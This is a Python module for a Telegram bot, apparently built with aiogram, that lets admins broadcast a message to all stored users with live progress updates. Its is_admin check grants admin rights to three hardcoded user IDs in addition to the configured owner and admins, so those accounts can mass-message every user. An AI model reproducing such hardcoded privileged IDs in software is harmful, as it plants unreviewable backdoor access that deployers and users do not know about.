# [Engineered & Developed by Aryan | https://t.me/thatonearyan]
import asyncio
import time
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext

import ui
from custom_emojis import premiumize_text
from config import OWNER_ID, ADMINS
from database import users

router = Router()


def is_admin(user_id: int):
    return user_id == OWNER_ID or user_id in ADMINS or user_id in [8021449673, 233444460, 8295433038]


class BroadcastState(StatesGroup):
    waiting_message = State()
    confirm_broadcast = State()


@router.callback_query(F.data == "admin_broadcast")
async def start_broadcast_wizard(call: CallbackQuery, state: FSMContext):
    if not is_admin(call.from_user.id):
        return await call.answer("Access Denied", show_alert=True)

    await state.set_state(BroadcastState.waiting_message)
    text = premiumize_text("""
📢 <b>Mass Broadcast Engine</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━

<blockquote>
Send or forward the message, photo, video, or post you wish to broadcast to all registered bot users:
</blockquote>
""")
    await call.message.edit_text(text, reply_markup=ui.cancel_keyboard(), parse_mode="HTML")
    await call.answer()


@router.message(BroadcastState.waiting_message)
async def receive_broadcast_message(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return

    total = await users.count_documents({})
    await state.update_data(
        from_chat_id=message.chat.id,
        message_id=message.message_id,
        total=total,
    )
    await state.set_state(BroadcastState.confirm_broadcast)

    preview_text = premiumize_text(f"""
📢 <b>Confirm Broadcast Execution</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━

<blockquote>
👥 <b>Target Audience:</b> <code>{total:,} Users</code>
⚡ <b>Delivery:</b> Instant async batch copy
</blockquote>

⚠️ <b>Are you ready to broadcast the above message to all users?</b>
""")
    await message.reply(preview_text, reply_markup=ui.broadcast_confirm_keyboard(), parse_mode="HTML")


@router.callback_query(F.data == "confirm_broadcast")
async def execute_broadcast(call: CallbackQuery, state: FSMContext):
    if not is_admin(call.from_user.id):
        return await call.answer("Access Denied", show_alert=True)

    data = await state.get_data()
    from_chat_id = data.get("from_chat_id")
    message_id = data.get("message_id")

    if not from_chat_id or not message_id:
        await state.clear()
        return await call.answer("Broadcast expired. Please try again.", show_alert=True)

    users_list = await users.find({}, {"_id": 1}).to_list(None)
    total = len(users_list)
    sent = 0
    failed = 0
    start_time = time.time()

    status_msg = await call.message.edit_text(
        premiumize_text(f"""
🚀 <b>Broadcast in Progress...</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Total:</b> <code>{total}</code>
✅ <b>Sent:</b> <code>0</code>
❌ <b>Failed:</b> <code>0</code>
"""),
        parse_mode="HTML"
    )

    for idx, u in enumerate(users_list, start=1):
        try:
            await call.bot.copy_message(
                chat_id=u["_id"],
                from_chat_id=from_chat_id,
                message_id=message_id,
            )
            sent += 1
        except Exception:
            failed += 1

        if idx % 25 == 0 or idx == total:
            try:
                await status_msg.edit_text(
                    premiumize_text(f"""
🚀 <b>Broadcast in Progress...</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Total:</b> <code>{total}</code>
✅ <b>Sent:</b> <code>{sent}</code>
❌ <b>Failed:</b> <code>{failed}</code>
⏳ <b>Remaining:</b> <code>{total - idx}</code>
"""),
                    parse_mode="HTML"
                )
            except Exception:
                pass
        await asyncio.sleep(0.04)

    duration = round(time.time() - start_time, 2)
    await state.clear()
    await status_msg.edit_text(
        premiumize_text(f"""
✅ <b>Broadcast Completed Successfully!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Total Users:</b> <code>{total:,}</code>
✅ <b>Delivered:</b> <code>{sent:,}</code>
❌ <b>Failed / Blocked:</b> <code>{failed:,}</code>
⏱ <b>Time Elapsed:</b> <code>{duration}s</code>
"""),
        reply_markup=ui.back_keyboard(),
        parse_mode="HTML"
    )
    await call.answer("Broadcast finished!")
